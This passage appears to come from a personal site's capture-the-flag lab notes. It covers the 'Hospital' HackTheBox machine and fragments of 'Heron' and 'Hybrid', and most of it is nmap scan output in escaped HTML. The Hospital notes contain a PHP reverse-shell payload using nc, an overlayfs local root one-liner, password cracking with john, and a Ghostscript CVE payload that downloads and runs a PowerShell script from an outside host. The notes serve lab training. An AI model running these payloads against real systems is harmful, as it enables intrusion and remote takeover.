class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxychains -q nxc smb 10.10.168.101 -u users -p \u003cspan class=\"s1\"\u003e\u0026#39;H3r0n2024#!\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSMB         10.10.168.101   \u003cspan class=\"m\"\u003e445\u003c/span\u003e    MUCDC            \u003cspan class=\"o\"\u003e[\u003c/span\u003e*\u003cspan class=\"o\"\u003e]\u003c/span\u003e Windows Server \u003cspan class=\"m\"\u003e2022\u003c/span\u003e Standard \u003cspan class=\"m\"\u003e20348\u003c/span\u003e x64 \u003cspan class=\"o\"\u003e(\u003c/span\u003ename:MUCDC\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003edomain:heron.vl\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003esigning:True\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eSMBv1:True\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSMB         10.10.168.101   \u003cspan class=\"m\"\u003e445\u003c/span\u003e    MUCDC            \u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e heron.vl\u003cspan class=\"se\"\u003e\\s\u003c/span\u003evc-web-accounting-d:H3r0n2024#!\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eSMB :\u003c/p\u003e","tags":[],"title":"Heron"},{"content":"#File_upload\nScan : PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA) |_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519) 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-07 04:13:39Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: Hospital Webmail :: Welcome to Hospital Webmail | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 1801/tcp open msmq? 2103/tcp open msrpc Microsoft Windows RPC 2105/tcp open msrpc Microsoft Windows RPC 2107/tcp open msrpc Microsoft Windows RPC 2179/tcp open vmrdp? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.hospital.htb | Not valid before: 2024-03-05T17:36:21 |_Not valid after: 2024-09-04T17:36:21 | rdp-ntlm-info: | Target_Name: HOSPITAL | NetBIOS_Domain_Name: HOSPITAL | NetBIOS_Computer_Name: DC | DNS_Domain_Name: hospital.htb | DNS_Computer_Name: DC.hospital.htb | DNS_Tree_Name: hospital.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-03-07T04:14:35+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 6062/tcp open msrpc Microsoft Windows RPC 6404/tcp open msrpc Microsoft Windows RPC 6406/tcp open msrpc Microsoft Windows RPC 6407/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6409/tcp open msrpc Microsoft Windows RPC 6615/tcp open msrpc Microsoft Windows RPC 6635/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Login |_Requested resource was login.php |_http-server-header: Apache/2.4.55 (Ubuntu) |_http-open-proxy: Proxy might be redirecting requests 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-03-07T04:14:36 |_ start_date: N/A |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\rDC : DC.hospital.htb\nLogin page :\nhttp://hospital.htb:8080/login.php\r`User find : admin'\nDirectory enum : index.php login.php register.php uploads upload.php images css js logout.php success.php vendor config.php fonts Find the right extension with burp : ![[upload 2.png]]\nScript generate extension list :\nvar = \u0026#34;.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\u0026#34; var_list = var.split(\u0026#34;, \u0026#34;) with open(\u0026#34;extensions.txt\u0026#34;, \u0026#34;w\u0026#34;) as file: for extension in var_list: file.write(extension + \u0026#34;\\n\u0026#34;)\r![[upload 7.png]]\nCheck every file that send an echo \u0026ldquo;test\u0026rdquo; : ![[upload 6.png]] Same technique now check every response that print Demonize or \u0026quot;test\u0026quot;\n![[upload 4.png]]\nCheck the disable function : ![[upload 3.png]] The right extension is .phar and the enable function is \u0026quot;popen\u0026quot;\nShell : \u0026lt;?php echo fread(popen(\u0026#34;mkfifo /tmp/f;nc 10.10.15.26 4242 0\u0026lt;/tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|tee /tmp/f\u0026#34;, \u0026#34;r\u0026#34;), 4096); ?\u0026gt;\rFirst Foothold privesc CVE : $unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39;\u0026#34;\rGet the drwilliams\u0026rsquo;s password : #Shadow_file unshadow passwd shadow \u0026gt; passwords.txt john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt drwilliams : qwe123!@#\nCredential database : \u0026lt;?php /* Database credentials. Assuming you are running MySQL server with default setting (user \u0026#39;root\u0026#39; with no password) */ define(\u0026#39;DB_SERVER\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;root\u0026#39;); define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;my$qls3rv1c3!\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;hospital\u0026#39;);\rWindow foothold : python CVE.py --inject --payload \u0026#34; powershell IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.14.247:8080/shell.ps1\u0026#39;)\u0026#34; --filename malicious.eps\rGithub : https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\nPrivesc :\nC:\\xampp\\htdocs\\shell.php\rEvery file in htbdocs is own by Administrator so can place a webshell and get admin access ","date":"2023-09-07","id":54,"permalink":"/notes/lab/htb/hospital/","summary":"\u003cp\u003e#File_upload\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eScan :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE           VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain            Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec      Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-03-07 04:13:39Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap              Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hospital.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2028-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp  open  ssl/http          Apache httpd 2.4.56 \u003cspan class=\"o\"\u003e((\u003c/span\u003eWin64\u003cspan class=\"o\"\u003e)\u003c/span\u003e OpenSSL/1.1.1t PHP/8.0.28\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e tls-alpn: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  http/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Hospital Webmail :: Welcome to Hospital Webmail\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elocalhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2009-11-10T23:48:47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2019-11-08T23:48:47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.56 \u003cspan class=\"o\"\u003e(\u003c/span\u003eWin64\u003cspan class=\"o\"\u003e)\u003c/span\u003e OpenSSL/1.1.1t PHP/8.0.28\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ldapssl?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2028-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1801/tcp open  msmq?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2103/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2105/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2107/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2179/tcp open  vmrdp?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap              Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: hospital.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2028-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  globalcatLDAPssl?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2028-09-06T10:49:03\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server     Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-03-05T17:36:21\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-09-04T17:36:21\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: HOSPITAL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: HOSPITAL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: DC.hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: hospital.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.17763\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-03-07T04:14:35+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Not Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6062/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6404/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6406/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6407/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6409/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6615/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e6635/tcp open  msrpc             Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e8080/tcp open  http              Apache httpd 2.4.55 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-cookie-flags: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   /: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     PHPSESSID: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_      httponly flag not \u003cspan class=\"nb\"\u003eset\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-title: Login\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Requested resource was login.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.55 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-open-proxy: Proxy might be redirecting requests\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp open  mc-nmf            .NET Message Framing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OSs: Linux, Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-03-07T04:14:36\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   3:1:1: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eDC :\n\u003ccode\u003eDC.hospital.htb\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Hospital"},{"content":"#bypass_filter_with_base64 Scan :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-30 07:52:36Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.hybrid.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, 